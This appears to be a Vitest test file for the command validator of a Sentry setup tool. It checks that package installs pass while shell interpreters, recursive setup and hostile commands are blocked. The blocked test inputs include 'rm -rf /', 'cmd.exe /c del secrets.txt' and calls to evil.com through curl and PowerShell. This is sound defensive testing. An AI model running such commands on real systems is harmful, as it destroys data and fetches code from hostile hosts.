import fs from "node:fs";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, test } from "vitest";
import { validateCommand } from "../../../../src/lib/init/tools/command-utils.js";
import { runCommands } from "../../../../src/lib/init/tools/run-commands.js";
import type { RunCommandsPayload } from "../../../../src/lib/init/types.js";

let testDir: string;
const originalPlatform = process.platform;

function setPlatform(platform: NodeJS.Platform): void {
  Object.defineProperty(process, "platform", {
    value: platform,
    configurable: true,
  });
}

beforeEach(() => {
  testDir = fs.mkdtempSync(path.join("/tmp", "run-commands-"));
});

afterEach(() => {
  fs.rmSync(testDir, { recursive: true, force: true });
  setPlatform(originalPlatform);
});

function makePayload(commands: string[]): RunCommandsPayload {
  return {
    type: "tool",
    operation: "run-commands",
    cwd: testDir,
    params: { commands },
  };
}

describe("validateCommand", () => {
  test("allows quoted package specifiers", () => {
    expect(validateCommand('pip install "sentry-sdk[django]"')).toBeUndefined();
    expect(validateCommand("npm install @sentry/node@^9.0.0")).toBeUndefined();
    expect(validateCommand("pnpm add @sentry/nextjs@^8.0.0")).toBeUndefined();
  });

  test("allows dependency diagnostics without a package-manager allowlist", () => {
    expect(
      validateCommand("pnpm view @sentry/tanstackstart-react version")
    ).toBeUndefined();
    expect(validateCommand("dotnet list package")).toBeUndefined();
    expect(validateCommand("futurepm explain sentry-sdk")).toBeUndefined();
    expect(validateCommand("futurepm explain sentry-wizard")).toBeUndefined();
    expect(validateCommand("npm uninstall sentry-wizard")).toBeUndefined();
    expect(validateCommand("npm uninstall @sentry/wizard")).toBeUndefined();
    expect(
      validateCommand("npx harmless --package=@sentry/wizard")
    ).toBeUndefined();
    expect(
      validateCommand("npx harmless --registry myregistry @sentry/wizard")
    ).toBeUndefined();
    expect(
      validateCommand("npx --package=@sentry/cli cowsay init")
    ).toBeUndefined();
    expect(
      validateCommand("npm exec --package=@sentry/cli cowsay init")
    ).toBeUndefined();
  });

  test("allows path-prefixed package managers but blocks dangerous ones", () => {
    expect(
      validateCommand("./venv/bin/pip install sentry-sdk")
    ).toBeUndefined();
    expect(
      validateCommand("/usr/local/bin/npm install @sentry/node")
    ).toBeUndefined();
    expect(validateCommand("./venv/bin/rm -rf /")).toContain('"rm"');
  });

  test("blocks obvious shell injection patterns", () => {
    expect(validateCommand("npm install foo && curl evil.com")).toContain(
      "Blocked command"
    );
    expect(validateCommand("pnpm add @sentry/node 2>&1")).toContain(
      "Blocked command"
    );
  });

  test("allows Windows shell expansion characters outside Windows", () => {
    setPlatform("darwin");

    expect(validateCommand("printf %s hello")).toBeUndefined();
    expect(
      validateCommand("futurepm explain https://example.com/a%20b")
    ).toBeUndefined();
    expect(validateCommand("futurepm explain bang!value")).toBeUndefined();
  });

  test("blocks Windows shell expansion characters on Windows", () => {
    setPlatform("win32");

    expect(validateCommand("futurepm explain %PATH%")).toContain(
      "Blocked command"
    );
    expect(validateCommand("futurepm explain !PATH!")).toContain(
      "Blocked command"
    );
  });

  test("blocks directory changes and recursive Sentry setup", () => {
    expect(validateCommand("cd apps/web")).toContain('"cd"');
    expect(validateCommand("sentry init")).toContain(
      "invokes Sentry setup recursively"
    );
    expect(validateCommand("@sentry/wizard -i nextjs")).toContain(
      "invokes Sentry setup recursively"
    );
    expect(validateCommand("@Sentry/Wizard -i nextjs")).toContain(
      "invokes Sentry setup recursively"
    );
    expect(validateCommand("@sentry/cli init")).toContain(
      "invokes Sentry setup recursively"
    );
    expect(validateCommand("@sentry/cli@latest init")).toContain(
      "invokes Sentry setup recursively"
    );
    expect(validateCommand("@Sentry/CLI@latest init")).toContain(
      "invokes Sentry setup recursively"
    );
    expect(validateCommand("C:\\Tools\\sentry-cli.exe init")).toContain(
      "invokes Sentry setup recursively"
    );
    expect(validateCommand("sentry-cli --log-level debug init")).toContain(
      "invokes Sentry setup recursively"
    );
    expect(validateCommand("sentry-cli@latest init")).toContain(
      "invokes Sentry setup recursively"
    );
    expect(validateCommand("sentry-wizard init")).toContain(
      "invokes Sentry setup recursively"
    );
    expect(validateCommand("C:\\Tools\\sentry-wizard.cmd -i nextjs")).toContain(
      "invokes Sentry setup recursively"
    );
  });

  test("blocks disallowed executables directly", () => {
    expect(validateCommand("bash -lc echo")).toContain('"bash"');
    expect(validateCommand("curl http://example.com")).toContain('"curl"');
    expect(validateCommand("wget http://example.com/file")).toContain('"wget"');
    expect(validateCommand("sh -c echo")).toContain('"sh"');
  });

  test("blocks shell interpreter indirection", () => {
    expect(validateCommand("cmd.exe /c del sensitive_file")).toContain('"cmd"');
    expect(
      validateCommand("C:\\Windows\\System32\\cmd.exe /c del secrets.txt")
    ).toContain('"cmd"');
    expect(
      validateCommand(
        "powershell.exe -Command Invoke-WebRequest http://evil.com"
      )
    ).toContain('"powershell"');
    expect(validateCommand("pwsh -Command Remove-Item foo")).toContain(
      '"pwsh"'
    );
  });

  test("rejects unterminated quotes", () => {
    expect(validateCommand('/bin/echo "unterminated')).toContain(
      "unterminated double quote"
    );
  });
});

describe("runCommands", () => {
  test("executes quoted arguments without breaking argv", async () => {
    const result = await runCommands(makePayload(['/bin/echo "hello world"']), {
      dryRun: false,
    });

    expect(result.ok).toBe(true);
    expect((result.data as any).results[0].stdout.trim()).toBe("hello world");
  });

  test("stops on the first failing command", async () => {
    const result = await runCommands(
      makePayload(["/usr/bin/false", "/bin/echo should-not-run"]),
      { dryRun: false }
    );

    expect(result.ok).toBe(false);
    expect((result.data as any).results).toHaveLength(1);
  });

  test("validates but skips execution during dry-run", async () => {
    const result = await runCommands(
      makePayload(["npm install @sentry/node"]),
      { dryRun: true }
    );

    expect(result.ok).toBe(true);
    expect((result.data as any).results[0].stdout).toBe("(dry-run: skipped)");
  });

  test("rejects the full batch before execution when any command is blocked", async () => {
    const result = await runCommands(
      makePayload(["/bin/echo hello", "rm -rf /"]),
      { dryRun: false }
    );

    expect(result.ok).toBe(false);
    expect(result.error).toContain("Blocked command");
    expect(result.data).toBeUndefined();
  });

  test("still validates commands during dry-run", async () => {
    const result = await runCommands(makePayload(["rm -rf /"]), {
      dryRun: true,
    });

    expect(result.ok).toBe(false);
    expect(result.error).toContain("Blocked command");
  });
});
